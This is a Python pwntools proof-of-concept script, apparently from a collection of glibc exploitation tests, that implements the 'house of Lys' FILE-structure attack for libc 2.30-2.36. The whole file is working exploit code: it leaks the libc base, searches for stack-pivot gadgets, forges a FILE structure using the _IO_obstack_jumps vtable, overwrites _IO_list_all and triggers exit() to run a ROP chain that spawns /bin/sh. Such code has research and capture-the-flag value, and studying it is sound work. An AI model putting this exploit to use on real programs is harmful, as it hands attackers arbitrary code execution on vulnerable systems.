"""house_of_Lys_stack_pivoting_when_exit_between_2_30_and_2_36 的 POC（libc 2.30-2.36）

Technique: Use _IO_obstack_jumps vtable + magic gadgets to pivot stack
and execute a ROP chain.

Trigger: exit() calls _IO_flush_all_lockp -> _IO_OVERFLOW
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from pwn import *
from pwncli.utils.toolkit.io_file import IO_FILE_plus_struct
from helper import *

context.arch = "amd64"
context.log_level = "info"

GLIBC_VERSION = "2.35-0ubuntu3"
IO_OBSTACK_JUMPS_OFFSET = 0x2163c0


def exploit():
    io, elf, libc = start(GLIBC_VERSION)

    libc.address = leak_libc_base(io, libc)
    log.success(f"libc base: {hex(libc.address)}")

    _IO_obstack_jumps = libc.address + IO_OBSTACK_JUMPS_OFFSET
    system = libc.sym['system']
    bin_sh = next(libc.search(b"/bin/sh\x00"))

    # Find magic gadgets
    # gadget1: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]
    try:
        magic_gadget_one = next(libc.search(asm("mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]")))
    except StopIteration:
        log.failure("Cannot find magic_gadget_one")
        io.close()
        return False

    # gadget2: mov rsp, rdx; ret
    try:
        magic_gadget_two = next(libc.search(asm("mov rsp, rdx; ret")))
    except StopIteration:
        log.failure("Cannot find magic_gadget_two")
        io.close()
        return False

    # gadget3: add rsp, 0x30; mov rax, r12; pop r12; ret
    try:
        magic_gadget_three = next(libc.search(asm("add rsp, 0x30; mov rax, r12; pop r12; ret")))
    except StopIteration:
        log.failure("Cannot find magic_gadget_three")
        io.close()
        return False

    log.info(f"magic_gadget_one: {hex(magic_gadget_one)}")
    log.info(f"magic_gadget_two: {hex(magic_gadget_two)}")
    log.info(f"magic_gadget_three: {hex(magic_gadget_three)}")

    pop_rdi = next(libc.search(asm("pop rdi; ret")))
    ret = pop_rdi + 1

    # ROP chain: system("/bin/sh")
    rop_chain = flat([
        pop_rdi,
        bin_sh,
        ret,
        system,
    ])

    # Allocate a large chunk for the fake FILE + ROP chain
    needed_size = 0x128 + len(rop_chain) + 0x100
    fp_addr = alloc(io, 0, needed_size)
    log.info(f"fake FILE at: {hex(fp_addr)}")

    fake_file = IO_FILE_plus_struct()
    payload = fake_file.house_of_Lys_stack_pivoting_when_exit_between_2_30_and_2_36(
        fp_heap_addr=fp_addr,
        _IO_obstack_jumps_addr=_IO_obstack_jumps,
        rop_payload=rop_chain,
        magic_gadget_one_addr=magic_gadget_one,
        magic_gadget_two_addr=magic_gadget_two,
        magic_gadget_three_addr=magic_gadget_three,
    )

    # Write the payload
    edit(io, 0, payload.ljust(needed_size, b'\x00'))

    # Make _IO_list_all point to our fake FILE
    _IO_list_all = libc.sym['_IO_list_all']
    arb_write(io, _IO_list_all, p64(fp_addr))

    # Trigger via exit
    log.info("Triggering exit()...")
    do_exit(io)

    io.sendline(b"echo PWNED")
    try:
        result = io.recvuntil(b"PWNED", timeout=3)
        if b"PWNED" in result:
            log.success("house_of_Lys_stack_pivoting_between_2_30_and_2_36: SUCCESS")
            io.close()
            return True
    except:
        pass

    log.failure("house_of_Lys_stack_pivoting_between_2_30_and_2_36: FAILED")
    io.close()
    return False


if __name__ == "__main__":
    result = exploit()
    sys.exit(0 if result else 1)
